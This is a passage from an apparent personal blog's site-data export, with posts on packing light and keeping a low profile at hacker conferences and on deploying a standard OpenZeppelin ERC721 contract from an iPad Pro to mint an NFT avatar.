to a Peak Design 30 L Everyday Backpack, as I think that the extra 10 L should be more than enough for me.&lt;/p&gt;\n&lt;p&gt;There’s enough (low profile) pockets in the Peak Design Everyday backpack that I don’t need a cord bag, and it’s a reasonable size to use as a day bag at the conference itself. This requires some unpacking/repacking at the hotel, but that’s a small price to pay to avoid having to carry an entire additional bag. Peak Design products are a bit pricey, but I’ve experimented with &lt;em&gt;a lot&lt;/em&gt; of different bags over the years and they’re hands-down the most durable, versatile bags I’ve ever owned.&lt;/p&gt;\n&lt;p&gt;One thing that’s enables me to pack light is that I’ve moved away from wearing jeans. Instead, I’ve switched to &lt;a href=&quot;https://shop.bluffworks.com/products/ascender-5-pocket-pants-regular-fit-asphalt-black&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Bluffworks’ Ascender 5-Pocket Pants&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, which are tough, light, wrinkle-resistant, &lt;em&gt;very&lt;/em&gt; compressible, and have the bonus of being much harder to pick pocket than most other mens’ pants (though again, a determined thief can still defeat them). I pair these with Icebreaker &lt;a href=&quot;https://www.icebreaker.com/en-us/mens-underwear&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;underwear&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; and &lt;a href=&quot;https://www.icebreaker.com/en-us/mens-socks&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;socks&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, which are also exceptionally light and durable. Bluffworks also makes &lt;a href=&quot;https://shop.bluffworks.com/products/gramercy-blazer-classic-fit-blue-hour&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;travel blazers&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; and &lt;a href=&quot;https://shop.bluffworks.com/pages/performance-suits&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;other outfits for less casual situations&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;; these are also good for traveling light, but by necessity take up a bit more space. There’s a trade-off between looking nice and packing light that is just difficult to navigate.&lt;/p&gt;\n&lt;p&gt;One disadvantage of this setup is that it’s difficult to bring multiple pairs of shoes. I opt to just wear a pair of black running shoes — they’re not dress shoes, but they’re comfortable and sufficiently understated that you can get away with using them in less casual situations in a pinch.&lt;/p&gt;\n&lt;h2 id=&quot;at-the-con&quot;&gt;At the con&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#at-the-con&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;At the conference, or really when traveling in general, I try to avoid being conspicuous. I don’t wear conference swag/merch. I don’t put stickers on my devices. I take off my conference badge and put it in my backpack when it’s not required. I don’t flash (or carry) big wads of cash.&lt;/p&gt;\n&lt;p&gt;In short, I try not to &lt;em&gt;look&lt;/em&gt; like a target. Ideally, there should be no way for someone who sees you outside of the conference to know that you are an attendee.&lt;/p&gt;\n&lt;h3 id=&quot;a-note-on-masks&quot;&gt;A note on masks&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#a-note-on-masks&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;I don’t like wearing masks, but if I’m going to wear one I’m going to wear an &lt;em&gt;effective&lt;/em&gt; one. Since HOPE and DEF CON were both masked events, I brought along tight-fitting &lt;a href=&quot;https://bnx.com/products/n95-mask-black-made-in-usa-bifold-h95b/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;N95 masks&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; for use while attending the conference.&lt;/p&gt;\n&lt;p&gt;The problem with a well-fitted N95 masks is that they’re kind of a pain to take off. This makes both eating and (more importantly) drinking a less attractive proposition. I wound up going back to my hotel to do both during the day, which created larger gaps in my schedule than I planned.&lt;/p&gt;\n&lt;p&gt;Moving forward, I don’t think it makes sense to bring a water bottle to any events that have a mask requirement. I also need to remember that I can’t effectively pull off my normal back-to-back-to-back event schedule at conferences with mask requirements. This means doing &lt;em&gt;less&lt;/em&gt; at these events than I otherwise would, but &lt;em&gt;c’est la vie&lt;/em&gt; in the time of plague.&lt;/p&gt;","rssInclude":true},"journals/2022-11-27":{"slug":"journals/2022-11-27","filePath":"journals/2022-11-27.md","title":"Trying (and failing) to deploy a smart contract using an iPad Pro","links":["spells/Uniform-resource-locators"],"tags":["Journal/Commentary"],"content":"My personal project this weekend was to deploy a smart contract to the Ethereum blockchain. The motivation here was to be able to mint an NFT (really, several NFTs) for use as an avatar on Farcaster, an alternative to Twitter that I’ve been experimenting with for a few weeks now. Using an NFT as your avatar on Farcaster adds a “purple checkmark” to your account, a spoof on Twitter’s infamous blue checkmark.\n(For those who are interested, Twitter provides the ability to set an NFT as your avatar, though you need to subscribe to “Twitter Blue” and be using iOS in order to access this feature.)\nThe central problem here is that if I use an NFT as my avatar, then I need to pay for another NFT (either to buy one or mint one myself) whenever I decide I want to change my avatar. Also, my current (and favorite) avatar is taken from a John Schoenherr painting of one of the great sandworms of Arrakis — I’m not sure I want to “mint” that in any way that could be interpreted as me claiming “ownership” of it. It’s Schoenherr’s painting after all!\nFinally, all of the services I’ve seen that allow you to mint your own NFT store the associated JSON metadata and image file using a decentralized solution like IPFS or Arweave. This is actually a good thing, because it gives “collectable” NFTs a degree of permanence, but in my case I actually want to be able to update the associated metadata and image arbitrarily. Fortunately, I control my own domain and EIP-721 (which defines the NFT standard) doesn’t forbid using “non-permenant” URIs, so all this means is that I need to deploy my own smart contract to create my NFT avatar(s), rather than using a pre-packaged solution.\nThat all sounds easy enough, but I also wanted to try to do this using only my iPad Pro, since I regard that as a more secure computing device than a regular desktop. (In fact, I’ve gradually come to prefer my iPad Pro over my laptop, so it’s not just about system security.) As you can probably guess from the title of this post, I failed to accomplish this particular goal… Though I came very close to succeeding!\nWhile working on the iPad, I used Safari with the Light Wallet extension for interacting with the Ethereum blockchain.\nAs fate would have it, I started using a standard location for my avatar (necopinus.xyz/​avatar/​avatar.webp) when I set up my ENS domains. For some reason the correct URL isn’t showing up on the ENS console, even though it appears to be set when I view it in the controlling Safe app. I’m not sure why this is, but the important thing is that I already have a standard location for my avatar.\nThe first real step was thus to upload a JSON metadata file pointing to this avatar.\n{\n\t&quot;description&quot;:&quot;The avatar NFT for necopinus.&quot;,\n\t&quot;external_url&quot;:&quot;necopinus.xyz/&quot;,\n\t&quot;image&quot;:&quot;necopinus.xyz/avatar/avatar.webp&quot;,\n\t&quot;name&quot;:&quot;necopinus&quot;\n}\nI put this at necopinus.xyz/​avatar/​ethereum/​&lt;WALLET_ADDRESS&gt;.json to make it straight forward to support additional wallets and blockchains in the future.\nOnce this was done, I decided to more-or-less follow the “How to Develop an NFT Smart Contract (ERC721) with Alchemy” walk-through. I’m going to skip a lot of the details here, so if you’re trying to do this yourself you should also read through that document.\nI also tested deploying the smart contract and minting my NFTs on the Goerli TestNet before committing any money to deploy on the Ethereum MainNet. To do this, you’ll need to get some GoerliETH; the easiest way to do this is to create an account on Alchemy and then visit the Goerli “faucet”, which will transfer 0.2 GoerliETH to your wallet (more than enough for what follows.\nNext, go to the Open Zeppelin Contracts Wizard to pre-generate smart contract code. I’m going to select an ERC721 contract and select the “Mintable, Autoincrement IDs”, “Enumerable”, and “URI Storage” options + uncreative contract and token names. This produces the following code.\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.9;\n \nimport &quot;@openzeppelin/contracts/token/ERC721/ERC721.sol&quot;;\nimport &quot;@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol&quot;;\nimport &quot;@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol&quot;;\nimport &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;\nimport &quot;@openzeppelin/contracts/utils/Counters.sol&quot;;\n \ncontract NFTAvatar is ERC721, ERC721Enumerable, ERC721URIStorage, Ownable {\n    using Counters for Counters.Counter;\n \n    Counters.Counter private _tokenIdCounter;\n \n    constructor() ERC721(&quot;NFTAvatar&quot;, &quot;NFTAVATAR&quot;) {}\n \n    function safeMint(address to, string memory uri) public onlyOwner {\n        uint256 tokenId = _tokenIdCounter.current();\n        _tokenIdCounter.increment();\n        _safeMint(to, tokenId);\n        _setTokenURI(tokenId, uri);\n    }\n \n    // The following functions are overrides required by Solidity.\n \n    function _beforeTokenTransfer(address from, address to, uint256 tokenId, uint256 batchSize)\n        internal\n        override(ERC721, ERC721Enumerable)\n    {\n        super._beforeTokenTransfer(from, to, tokenId, batchSize);\n    }\n \n    function _burn(uint256 tokenId) internal override(ERC721, ERC721URIStorage) {\n        super._burn(tokenId);\n    }\n \n    function tokenURI(uint256 tokenId)\n        public\n        view\n        override(ERC721, ERC721URIStorage)\n        returns (string memory)\n    {\n        return super.tokenURI(tokenId);\n    }\n \n    function supportsInterface(bytes4 interfaceId)\n        public\n        view\n        override(ERC721, ERC721Enumerable)\n        returns (bool)\n    {\n        return super.supportsInterface(interfaceId);\n    }\n}\nSince I’m not producing NFTs for public consumption, I skipped the parts of the Alchemy walk-through where this code was modified to cap the number of NFTs and make it possible for addresses other than the contract’s owner to call it.\nUp until now, Safari, Light Wallet, and the iPad Pro work swimmingly. Unfortunately, the web-based Ethereum Remix IDE, which is how we’ll deploy the smart contract code above, does not play well with this setup.  The issue might be Safari, or it might be Light Wallet; I’m not sure, but the behavior of Remix on both iPadOS and macOS is identical: You can compile the smart contract code (though lockdown mode must be disabled for the site), but attempting to deploy the code always results in a mysterious “Transaction Failed” error message.\nEventually I installed Brave on my MacBook for the sole purpose of being able to deploy the smart contract code. Brave’s built-in wallet works perfectly with Remix.\nYou’ll want to note down the version of Solidity you used to compile the smart contract, the wallet address you used to deploy it, and the smart contract’s address on the blockchain. With this information, you can always return to remix, recompile the smart contract code, connect the controlling wallet, and then reconnect to the smart contract to mint additional NFTs.\nOnce the contract was deployed, the only other stumbling block I ran into was that it’s not obvious that the safeMint function requires two arguments — the first is the address to send the NFT to, and the second is the metadata URI. You can use the chevron next to the function name in Remix to expand both arguments into separate fields, which makes it more obvious how to enter in the necessary information.\nThe tokenURI function is also useful: When called with the token ID (an incrementing integer, starting at 0), it will return the metadata URI for the corresponding NFT.\nThe minted NFTs took a looooong time to show up in MetaMask, but they did show up in OpenSea pretty much immediately. You can use the OpenSea interface to transfer the minted NFTs to other accounts.\nIt’s worth noting here that viewing and transferring any NFTs you mint works fine on Safari + Light Wallet. It’s only the Remix IDE that doesn’t like that setup, and in fact it’s only deploying and interacting with your contract that’s broken. Everything else in this process can be done using iPadOS. Hopefully this situation will improve over time.","richContent":"&lt;p&gt;My personal project this weekend was to deploy a smart contract to the Ethereum blockchain. The motivation here was to be able to mint an NFT (really, several NFTs) for use as an avatar on &lt;a href=&quot;https://www.farcaster.xyz/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Farcaster&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, an alternative to Twitter that &lt;a href=&quot;https://fcast.me/necopinus&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;I’ve been experimenting with&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; for a few weeks now. Using an NFT as your avatar on Farcaster adds a “&lt;a href=&quot;https://farcasterxyz.notion.site/How-to-get-a-purple-checkmark-fb66f0cb0f5f4f24b699b8f288a2f14a&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;purple checkmark&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;” to your account, a spoof on Twitter’s infamous &lt;a href=&quot;https://help.twitter.com/managing-your-account/about-twitter-verified-accounts&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;blue checkmark&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;p&gt;(For those who are interested, &lt;a href=&quot;https://support.opensea.io/hc/en-us/articles/4415562648851-How-do-I-set-my-NFT-as-my-Twitter-profile-picture-&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Twitter provides the ability to set an NFT as your avatar&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, though you need to subscribe to “Twitter Blue” and be using iOS in order to access this feature.)&lt;/p&gt;\n&lt;p&gt;The central problem here is that if I use an NFT as my avatar, then I need to pay for another NFT (either to buy one or mint one myself) whenever I decide I want to change my avatar. Also, my current (and favorite) avatar is taken from a &lt;a href=&quot;https://dangerousminds.net/comments/the_artist_who_visited_dune&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;John Schoenherr&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; painting of one of the great sandworms of Arrakis — I’m not sure I want to “mint” that in any way that could be interpreted as me claiming “ownership” of it. It’s Schoenherr’s painting after all!&lt;/p&gt;\n&lt;p&gt;Finally, all of the services I’ve seen that allow you to mint your own NFT store the associated JSON metadata and image file using a decentralized solution like &lt;a href=&quot;https://ipfs.tech/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;IPFS&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; or &lt;a href=&quot;https://www.arweave.org/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Arweave&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;. This is actually a good thing, because it gives “collectable” NFTs a degree of permanence, but in my case I actually &lt;em&gt;want&lt;/em&gt; to be able to update the associated metadata and image arbitrarily. Fortunately, I control my own domain and &lt;a href=&quot;https://eips.ethereum.org/EIPS/eip-721&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;EIP-721&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; (which defines the NFT standard) doesn’t forbid using “non-permenant” &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Uniform-resource-locators&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Uniform-resource-locators&quot;&gt;URIs&lt;/a&gt;, so all this means is that I need to deploy my own smart contract to create my NFT avatar(s), rather than using a pre-packaged solution.&lt;/p&gt;\n&lt;p&gt;That all sounds easy enough, but I &lt;em&gt;also&lt;/em&gt; wanted to try to do this using only my iPad Pro, since I regard that as a more secure computing device than a regular desktop. (In fact, I’ve gradually come to prefer my iPad Pro over my laptop, so it’s not &lt;em&gt;just&lt;/em&gt; about system security.) As you can probably guess from the title of this post, I failed to accomplish this particular goal… Though I came &lt;em&gt;very&lt;/em&gt; close to succeeding!&lt;/p&gt;\n&lt;p&gt;While working on the iPad, I used Safari with the &lt;a href=&quot;https://wallet.light.so&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Light Wallet&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; extension for interacting with the Ethereum blockchain.&lt;/p&gt;\n&lt;p&gt;As fate would have it, I started using a standard location for my avatar (&lt;a href=&quot;https://necopinus.xyz/%E2%80%8Bavatar/%E2%80%8Bavatar.webp&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;https://necopinus.xyz/​avatar/​avatar.webp&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;) when I set up my ENS domains. For some reason the correct URL isn’t showing up on &lt;a href=&quot;https://app.ens.domains/name/necopinus.xyz/details&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;the ENS console&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, even though it appears to be set when I view it in the controlling &lt;a href=&quot;https://app.safe.global/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Safe&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; app. I’m not sure why this is, but the important thing is that I already have a standard location for my avatar.&lt;/p&gt;\n&lt;p&gt;The first real step was thus to upload a JSON metadata file pointing to this avatar.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;json&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;json&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;{&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#99841877;--shiki-dark:#B8A96577&quot;&gt;\t&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;description&lt;/span&gt;&lt;span style=&quot;--shiki-light:#99841877;--shiki-dark:#B8A96577&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;The avatar NFT for necopinus.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#99841877;--shiki-dark:#B8A96577&quot;&gt;\t&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;external_url&lt;/span&gt;&lt;span style=&quot;--shiki-light:#99841877;--shiki-dark:#B8A96577&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;https://necopinus.xyz/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#99841877;--shiki-dark:#B8A96577&quot;&gt;\t&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;image&lt;/span&gt;&lt;span style=&quot;--shiki-light:#99841877;--shiki-dark:#B8A96577&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;https://necopinus.xyz/avatar/avatar.webp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#99841877;--shiki-dark:#B8A96577&quot;&gt;\t&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;--shiki-light:#99841877;--shiki-dark:#B8A96577&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;necopinus&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;I put this at &lt;code&gt;https://necopinus.xyz/​avatar/​ethereum/​&amp;#x3C;WALLET_ADDRESS&gt;.json&lt;/code&gt; to make it straight 